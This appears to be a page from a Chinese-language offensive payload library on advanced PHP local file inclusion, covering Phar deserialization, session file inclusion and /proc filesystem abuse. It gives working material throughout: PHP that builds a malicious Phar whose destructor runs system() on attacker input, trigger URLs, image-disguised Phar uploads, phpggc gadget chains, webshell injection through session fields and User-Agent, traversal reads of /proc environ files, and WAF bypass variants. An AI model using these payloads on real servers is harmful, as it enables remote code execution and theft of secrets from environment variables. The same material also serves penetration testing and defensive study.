# Phar / Session / Proc 高级 LFI payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:Phar 反序列化(任意函数触发自动反序列化)+ Session 文件包含(`/var/lib/php/sessions/sess_xxx`)+ Proc 文件系统利用(`/proc/self/environ`、`/proc/self/fd/N`)。

---

## A. Phar 反序列化

利用Phar反序列化进行RCE
子类：**Phar反序列化** · tags: `lfi` `phar` `deserialization` `rce`

**前置条件：** 存在LFI漏洞；PHP环境；phar扩展可用

**攻击链：**

**1. 1. 创建Phar文件**
_创建恶意Phar文件_
```
# 创建恶意Phar
<?php
class Exploit {
    function __destruct() {
        system($_GET['c']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```

**2. 2. 触发反序列化**
_触发Phar反序列化_
```
# 通过file_exists触发
?file=phar://exploit.phar&c=id

# 通过file_get_contents触发
?file=phar://exploit.phar/test.txt&c=id

# 通过include触发
?file=phar://exploit.phar&c=id
```

**3. 3. 图片马Phar**
_使用图片马Phar_
```
# 创建图片Phar
copy exploit.phar exploit.gif

# 或添加GIF头
cp exploit.phar exploit.gif

# 触发
?file=phar://uploads/exploit.gif&c=id
```

**4. 4. 常见Gadget链**
_使用常见Gadget链_
```
# Laravel POP链
# Symfony POP链
# WordPress POP链
# ThinkPHP POP链

# 使用phpggc生成
git clone https://github.com/ambionics/phpggc
php phpggc Laravel/RCE1 system id > exploit.phar
```

**WAF/EDR 绕过变体：**

**1. Base64编码**
_Base64编码绕过_
```
# 将Phar内容Base64编码
# 然后解码触发
```

**2. 伪协议组合**
_伪协议组合_
```
?file=php://filter/convert.base64-encode/resource=phar://exploit.phar
# 组合使用
```

---

### Session文件包含  `lfi-session`
利用Session文件进行LFI攻击
子类：**Session包含** · tags: `lfi` `session` `file` `inclusion`

**前置条件：** 存在LFI漏洞；可控制Session内容；知道Session路径

**攻击链：**

**1. 1. 探测Session路径**
_探测Session存储路径_
```
# Linux默认路径
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php7/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
/c:/windows/temp/sess_[PHPSESSID]
```

**2. 2. 控制Session内容**
_控制Session内容_
```
# 通过用户输入控制Session
# 例如用户名、个人简介等
username: <?php system($_GET['c']); ?>

# 或通过Cookie
Set-Cookie: PHPSESSID=malicious
```

**3. 3. 包含Session文件**
_包含Session文件执行代码_
```
# 包含Session文件
?file=/var/lib/php/sessions/sess_abc123&c=id

# 或使用相对路径
?file=../../../var/lib/php/sessions/sess_abc123&c=id
```

**4. 4. Session竞争条件**
_利用Session竞争条件_
```
# 利用Session竞争
# 1. 持续写入恶意代码到Session
# 2. 同时包含Session文件
# 3. 在Session被清理前执行
```

**WAF/EDR 绕过变体：**

**1. Session ID预测**
_预测Session ID_
```
# 尝试预测Session ID
# 常见模式: md5(ip.time.random)
# 暴力枚举Session ID
```

---

### Proc文件系统利用  `lfi-proc`
利用/proc文件系统进行LFI攻击
子类：**Proc文件系统** · tags: `lfi` `proc` `linux` `environ`

**前置条件：** 存在LFI漏洞；Linux系统；/proc可访问

**攻击链：**

**1. 1. 读取进程信息**  _[linux]_
_读取当前进程信息_
```
# 当前进程信息
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd
/proc/self/exe
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

**2. 2. 读取环境变量**  _[linux]_
_读取环境变量执行代码_
```
?file=../../../proc/self/environ

# 在User-Agent中注入
User-Agent: <?php system($_GET['c']); ?>

# 包含执行
?file=../../../proc/self/environ&c=id
```

**3. 3. 通过fd读取日志**  _[linux]_
_通过fd读取日志_
```
# fd文件描述符
/proc/self/fd/10
/proc/self/fd/20

# 尝试不同编号找到日志
?file=../../../proc/self/fd/10
```

**4. 4. 读取其他进程**  _[linux]_
_读取其他进程信息_
```
# 枚举进程
/proc/[pid]/cmdline
/proc/[pid]/environ
/proc/[pid]/maps

# 暴力枚举
?file=../../../proc/1/cmdline
?file=../../../proc/2/cmdline
```

**WAF/EDR 绕过变体：**

**1. 使用self**  _[linux]_
_使用self引用_
```
?file=/proc/self/environ
?file=proc/self/environ
```

---

---

← 回 [00-index.md](00-index.md) · 相关:[`../rce/12-deserialization.md`](../rce/12-deserialization.md)(通用反序列化)
